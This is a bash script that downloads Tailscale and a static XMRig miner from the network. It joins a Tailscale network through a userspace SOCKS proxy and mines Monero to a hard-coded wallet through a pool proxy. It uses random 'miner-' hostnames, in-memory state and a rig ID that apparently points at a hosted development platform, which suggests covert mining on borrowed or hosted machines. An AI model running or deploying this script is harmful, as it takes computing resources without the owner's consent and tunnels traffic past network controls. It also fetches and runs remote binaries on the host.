#!/bin/bash

# --- CONFIGURATION ---
# This line grabs the key you pass in the command line
cleanup() {
    echo "Stopping miner and removing node from Tailnet..."
    # Force an immediate logout/deletion from the Tailscale dashboard
    ./tailscale --socket=ts.sock logout
    exit
}

# This "traps" the exit of the script (Ctrl+C, termination, or normal finish)
trap cleanup EXIT INT TERM

TS_KEY="${TS_KEY:-$1}"

if [ -z "$TS_KEY" ]; then
    echo "ERROR: No TS_KEY provided. Use: TS_KEY='your-key' ./script86.sh"
    exit 1
fi

# IMPORTANT: Replace this with your Docker container's 100.x.x.x IP
DOCKER_PROXY_IP="arthurmorgan" 
WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"

# 1. DOWNLOAD TAILSCALE (ARM64)
if [ ! -f "./tailscale" ]; then
    echo "Downloading Tailscale for AMD64..."
    wget -q https://pkgs.tailscale.com/stable/tailscale_latest_amd64.tgz
    tar xzf tailscale_latest_amd64.tgz --strip-components=1
    chmod +x tailscale tailscaled
fi

# 2. DOWNLOAD MINER (If not already there)
if [ ! -f "./xmrig-x86_64-static" ]; then
    echo "Downloading XMRig for AMD64..."
    wget https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static
    chmod +x xmrig-x86_64-static
fi

# Cleanup old sessions
pkill -f tailscaled
pkill -f xmrig-x86_64-st
rm -f ts.state ts.sock

echo "Starting Tailscale..."
./tailscaled --tun=userspace-networking --socket=ts.sock --state=mem: --socks5-server=localhost:1055 &
sleep 5

echo "Connecting to Tailnet..."
./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="miner-$RANDOM" --accept-dns=false
sleep 5

echo "Launching XMRig..."
./xmrig-x86_64-static \
  -c config.json \
  -o "$DOCKER_PROXY_IP:9999" \
  -u "$WALLET" \
  --proxy "127.0.0.1:1055" \
  --no-tls \
  --rig-id "pythagora-$(hostname)"



